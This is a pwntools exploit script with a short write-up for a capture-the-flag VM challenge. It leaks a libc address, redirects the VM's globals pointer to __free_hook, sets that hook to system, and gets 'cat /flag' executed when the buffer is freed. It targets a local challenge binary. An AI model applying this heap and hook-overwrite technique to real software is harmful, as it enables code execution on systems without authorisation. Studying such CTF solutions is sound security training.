from pwn import *

'''
Easy_VM - part 2 (pwn) write up
1. leak libc address and calculate other function address using served libc
	- system@libc
	- &__free_hook

2. in vm struct
```
    int *globals;
    int nglobals;

    // Operand stack, grows upwards
    int stack[DEFAULT_STACK_SIZE];
```
get globals pointer address using stack pop

3. overwrite globals pointer to &free_hook
4. overwrite free_hook to system@libc
5. revoke globals address to heap address
6. write command at globals buffer
7. halt and free(vm->globals);
'''

ins = {
	"noop" : 0,
	"iadd" : 1,
	"isub" : 2,
	"imul" : 3,
	"idiv" : 4,
	"irem" : 5,
	"ixor" : 6,
	"ilt" : 7,
	"ieq" : 8,
	"br" : 9,
	"brt" : 10,
	"brf" : 11,
	"iconst" : 12,
	"load" : 13,
	"gload" : 14,
	"store" : 15,
	"gstore" : 16,
	"print" : 17,
	"pop" : 18,
	"call" : 19,
	"ret" : 20,
	"halt" : 21	
}

# find pointer in gdb
# (gdb) find 0x55a3ea085000, +0x30000 , (char)0xf0, (char)0x57

'''
free_hook ==> 0x7f0e 7f7bc8e8
system ==> 0x7f0e 7f41e440
leak ==> 0x7f0e 7f7baca0
'''
cmd = [
	# libc for free_hook
	ins["gload"], -29,
	ins["store"], 102,

	ins["gload"], -30,
	ins["iconst"], 7240, # offset for free_hook
	ins["iadd"],
	ins["store"], 103,

	# libc for system
	ins["gload"], -30,
	ins["iconst"], 3786848, # offset for system
	ins["isub"],
	ins["store"], 104,

	ins["pop"],

	# save globals pointer to stack
	ins["store"], 100,
	ins["store"], 101,

	# overwrite globals pointer
	ins["load"], 103,
	ins["load"], 102,	

	# overwrite free_hook to system
	ins["load"], 104,
	ins["gstore"], 0,

	ins["load"], 102,
	ins["gstore"], 1,

	# revoke globals pointer
	ins["pop"],
	ins["pop"],
	ins["load"], 101,
	ins["load"], 100,
	
	ins["load"], 0,
	ins["load"], 0,

	# command (ls -al /)
	#ins["iconst"], 757101420,
	#ins["gstore"], 0,
	#ins["iconst"], 790654049,
	#ins["gstore"], 1,

	# write system command (cat /flag)
	ins["iconst"], 544498019,
	ins["gstore"], 0,
	ins["iconst"], 1634493999,
	ins["gstore"], 1,
	ins["iconst"], 103,
	ins["gstore"], 2,

	ins["halt"]
]

data = ", ".join(map(str, cmd))
data += "\n"

with open("./ex.txt", "w+") as fd:
	fd.write(data)
fd.close()

r = process(["./vm", "-f", "./ex.txt"])
r.interactive()

